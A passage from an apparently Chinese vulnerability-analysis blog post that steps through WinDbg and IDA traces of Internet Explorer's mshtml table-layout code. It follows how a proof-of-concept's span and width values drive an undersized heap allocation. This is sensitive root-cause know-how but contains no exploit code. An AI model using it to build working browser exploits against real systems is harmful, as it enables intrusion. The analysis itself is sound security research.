class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x5</span>:</span><br><span class="line">673b018f 81ec90000000    <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">90h</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=ffffffff <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b0195 <span class="built_in">esp</span>=0466e534 <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0xb</span>:</span><br><span class="line">673b0195 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=ffffffff <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b0196 <span class="built_in">esp</span>=0466e530 <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0xc</span>:</span><br><span class="line">673b0196 8b5d08          <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0466e5cc=08800ea8</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; <span class="built_in">dd</span> 08800ea8</span><br><span class="line">08800ea8  672a9868 0895ef30 08848fb8 <span class="number">67464918</span></span><br><span class="line">08800eb8  <span class="number">00000001</span> <span class="number">00000000</span> <span class="number">0108080d</span> ffffffff</span><br><span class="line">08800ec8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ffffffff</span><br><span class="line">08800ed8  <span class="number">00012174</span> 00007e90 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">08800ee8  <span class="number">00000000</span> <span class="number">00412802</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">08800ef8  <span class="number">00000000</span> <span class="number">00000001</span> ffffffff ffffffff</span><br><span class="line">08800f08  ffffffff ffffffff 672a9fd0 <span class="number">00000004</span></span><br><span class="line">08800f18  <span class="number">00000004</span> 0795aff0 672a9fd0 <span class="number">00000004</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; ln 672a9868 </span><br><span class="line">(672a9868)   mshtml!CTableLayout::<span class="string">`vftable'   |  (672a99a8)   mshtml!CTableLayoutBlock::`</span>vftable<span class="string">'</span></span><br><span class="line"><span class="string">Exact matches:</span></span><br><span class="line"><span class="string">    mshtml!CTableLayout::`vftable'</span> = &lt;no type information&gt;</span><br></pre></td></tr></table></figure>

<p>我们看到传进该函数的第一个参数是CTableLayout对象this指针（因为第一个地址是一个虚表），</p>
<p>单步到下面这行，这就是poc里面的span的值1了</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00412802</span> <span class="built_in">edx</span>=ffffffff <span class="built_in">esi</span>=0466e858 <span class="built_in">edi</span>=0466e824</span><br><span class="line"><span class="built_in">eip</span>=673b01a6 <span class="built_in">esp</span>=0466e52c <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x1c</span>:</span><br><span class="line">673b01a6 8b4354          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">54h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:08800efc=<span class="number">00000001</span></span><br></pre></td></tr></table></figure>

<p>我们用ida看看器传递路径，给到了arg0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:74D301A6                 mov     eax, [ebx+54h]</span><br><span class="line">.text:74D301A9                 mov     [ebp+arg_0], eax</span><br><span class="line">......</span><br><span class="line">.text:74D30289                 cmp     [ebp+arg_0], eax</span><br><span class="line">.text:74D3028C                 mov     ecx, [ebp+arg_0]</span><br><span class="line">.text:74D3028F                 jl      short loc_74D30293</span><br><span class="line">.text:74D30291                 mov     ecx, eax        ; this</span><br><span class="line">.text:74D30293</span><br><span class="line">.text:74D30293 loc_74D30293:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+105j</span><br><span class="line">.text:74D30293                 mov     edx, [ebp+arg_0]</span><br></pre></td></tr></table></figure>

<p>后面赋值给了edx</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">08800ea8</span> ecx=<span class="number">00000000</span> edx=<span class="number">0879bfd0</span> esi=<span class="number">0466e858</span> edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">673b0293</span> esp=<span class="number">0466e528</span> ebp=<span class="number">0466e5c4</span> iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">001b</span>  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003b</span>  gs=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x13a</span>:</span><br><span class="line"><span class="number">673b0293</span> <span class="number">8b5508</span>          mov     edx,dword ptr [ebp+<span class="number">8</span>] ss:<span class="number">0023</span>:<span class="number">0466e5cc</span>=<span class="number">00000001</span></span><br></pre></td></tr></table></figure>

<p>跟着ebx+94h右移两位后会和我们的edx比较，当然0右移多少还是0，所以是跟0比较</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000001</span> <span class="built_in">esi</span>=0466e858 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=673b02cc <span class="built_in">esp</span>=0466e528 <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x1b1</span>:</span><br><span class="line">673b02cc 8b8394000000    <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">94h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:08800f3c=<span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000001</span> <span class="built_in">esi</span>=0466e858 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=673b02d2 <span class="built_in">esp</span>=0466e528 <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x1b7</span>:</span><br><span class="line">673b02d2 c1e802          <span class="keyword">shr</span>     <span class="built_in">eax</span>,<span class="number">2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000001</span> <span class="built_in">esi</span>=0466e858 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=673b02d5 <span class="built_in">esp</span>=0466e528 <span class="built_in">ebp</span>=0466e5c4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x1ba</span>:</span><br><span class="line">673b02d5 3bc2            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br></pre></td></tr></table></figure>

<p>之后下面这个函数里面是分配内存的</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:74D302EC</span>                 <span class="selector-tag">push</span>    1<span class="selector-tag">Ch</span>             ; <span class="selector-tag">unsigned</span> <span class="selector-tag">int</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:74D302EE</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">eax</span>, <span class="selector-tag">edx</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:74D302F0</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">edi</span>, <span class="selector-tag">esi</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:74D302F2</span>                 <span class="selector-tag">call</span>    ?<span class="selector-tag">EnsureSizeWorker</span>@<span class="keyword">CImplAry</span>@@<span class="keyword">AAEJIJ</span>@<span class="keyword">Z</span> ; <span class="selector-tag">CImplAry</span><span class="selector-pseudo">::EnsureSizeWorker(uint</span>,<span class="selector-tag">long</span>)</span><br></pre></td></tr></table></figure>

<p>跟进去，发现是分配0x1c*4的内存</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000004</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000001</span> <span class="built_in">esi</span>=<span class="number">00000001</span> <span class="built_in">edi</span>=08800f38</span><br><span class="line"><span class="built_in">eip</span>=67478fd3 <span class="built_in">esp</span>=0466e50c <span class="built_in">ebp</span>=0466e51c iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000293</span></span><br><span class="line">mshtml!CImplAry::EnsureSizeWorker+<span class="number">0x3d</span>:</span><br><span class="line">67478fd3 f76508          <span class="keyword">mul</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0466e524=0000001c</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000070</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=<span class="number">00000001</span> <span class="built_in">edi</span>=08800f38</span><br><span class="line"><span class="built_in">eip</span>=67478fd6 <span class="built_in">esp</span>=0466e50c <span class="built_in">ebp</span>=0466e51c iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CImplAry::EnsureSizeWorker+<span class="number">0x40</span>:</span><br><span class="line">67478fd6 <span class="number">52</span>              <span class="keyword">push</span>    <span class="built_in">edx</span></span><br></pre></td></tr></table></figure>

<p>实际里面调用的是<code>_HeapRealloc</code></p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00000000</span> ecx=<span class="number">00000070</span> edx=<span class="number">00000000</span> esi=<span class="number">08800f44</span> edi=<span class="number">08800f38</span></span><br><span class="line">eip=<span class="number">67478</span>ff6 esp=<span class="number">0466e508</span> ebp=<span class="number">0466</span>e51c iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">001</span>b  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003</span>b  gs=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CImplAry::EnsureSizeWorker+<span class="number">0</span>x9c:</span><br><span class="line"><span class="number">67478</span>ff6 e86edcfdff      call    mshtml!_HeapRealloc (<span class="number">67456c69</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; dd esp</span><br><span class="line"><span class="number">0466e508</span>  <span class="number">00000070</span> <span class="number">08800f38</span> <span class="number">08800</span>ea<span class="number">8 00000070</span></span><br><span class="line"><span class="number">0466e518</span>  <span class="number">00000004</span> <span class="number">0466e5c4</span> <span class="number">673b02f7</span> <span class="number">0000001</span>c</span><br><span class="line"><span class="number">0466e528</span>  <span class="number">0466e824</span> <span class="number">00000000</span> <span class="number">08800</span>ea<span class="number">8 70a26693</span></span><br><span class="line"><span class="number">0466e538</span>  <span class="number">00000000</span> <span class="number">00000010</span> <span class="number">672</span>a9fd<span class="number">0 00000000</span></span><br><span class="line"><span class="number">0466e548</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">07</span>adbfd0</span><br><span class="line"><span class="number">0466e558</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">70</span>a28efa</span><br><span class="line"><span class="number">0466e568</span>  <span class="number">00000000</span> <span class="number">07</span>b504ac <span class="number">0466e598</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0466e578</span>  <span class="number">08848</span>fb<span class="number">8 00000000</span> <span class="number">0466</span>e5ac <span class="number">6747</span>ba70</span><br></pre></td></tr></table></figure>

<p>那我们继续跟，跟进GetAAspan，返回值为000003e8，即10进制的1000，也即trigger函数里面将span设置成了1000</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=0879dff0 <span class="built_in">esi</span>=672abde0 <span class="built_in">edi</span>=087a0fd0</span><br><span class="line"><span class="built_in">eip</span>=6733a01e <span class="built_in">esp</span>=0466dd30 <span class="built_in">ebp</span>=0466dd38 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableCol::GetAAspan+<span class="number">0x17</span>:</span><br><span class="line">6733a01e 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0466dd34=000003e8</span><br></pre></td></tr></table></figure>

<p>获取width的返回值有点怪</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=08848fb8 <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=07aebf80 <span class="built_in">edx</span>=0879dff0 <span class="built_in">esi</span>=0466e070 <span class="built_in">edi</span>=<span class="number">00000001</span></span><br><span class="line"><span class="built_in">eip</span>=67545ab3 <span class="built_in">esp</span>=0466dd38 <span class="built_in">ebp</span>=0466dddc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x454</span>:</span><br><span class="line">67545ab3 e82009dbff      <span class="keyword">call</span>    mshtml!CWidthUnitValue::GetPixelWidth (672f63d8)</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00414114</span> <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=07aebf80 <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=0466e070 <span class="built_in">edi</span>=<span class="number">00000001</span></span><br><span class="line"><span class="built_in">eip</span>=67545ab8 <span class="built_in">esp</span>=0466dd40 <span class="built_in">ebp</span>=0466dddc iopl=<span class="number">0</span>         ov <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=00000a06</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x459</span>:</span><br><span class="line">67545ab8 837da400        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">5Ch</span>],<span class="number">0</span> <span class="built_in">ss</span>:<span class="number">0023</span>:0466dd80=<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>但是一算跟我们的42765有点关联，就是<code>42765*100</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0x00414114</span></span><br><span class="line"><span class="number">4276500</span></span><br></pre></td></tr></table></figure>

<p>继续，由于这次调试ecx为0，所以还没触发异常，之后还会将eax给了[ebp-24h]，这个之后会给esi</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=000003e8 <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=0466e070 <span class="built_in">edi</span>=<span class="number">00000001</span></span><br><span class="line"><span class="built_in">eip</span>=67545b4f <span class="built_in">esp</span>=0466dd40 <span class="built_in">ebp</span>=0466dddc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x4f0</span>:</span><br><span class="line">67545b4f 8b839c000000    <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">9Ch</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:08800f44=08a85f90</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=08a85f90 <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=0466e070 <span class="built_in">edi</span>=<span class="number">00000001</span></span><br><span class="line"><span class="built_in">eip</span>=67545b55 <span class="built_in">esp</span>=0466dd40 <span class="built_in">ebp</span>=0466dddc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x4f6</span>:</span><br><span class="line">67545b55 03c1            <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=08a85f90 <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=0466e070 <span class="built_in">edi</span>=<span class="number">00000001</span></span><br><span class="line"><span class="built_in">eip</span>=67545b57 <span class="built_in">esp</span>=0466dd40 <span class="built_in">ebp</span>=0466dddc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x4f8</span>:</span><br><span class="line">67545b57 837de400        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>],<span class="number">0</span> <span class="built_in">ss</span>:<span class="number">0023</span>:0466ddc0=<span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=08a85f90 <span class="built_in">ebx</span>=08800ea8 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=0466e070 <span class="built_in">edi</span>=<span class="number">00000001</span></span><br><span class="line"><span class="built_in">eip</span>=67545b5b <span class="built_in">esp</span>=0466dd40 <span class="built_in">ebp</span>=0466dddc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+<span class="number">0x4fc</span>:</span><br><span class="line">67545b5b 8945dc          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">24h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:0466ddb8=08a85fac</span><br></pre></td></tr></table></figure>

<p>可以看到确实是的</p>
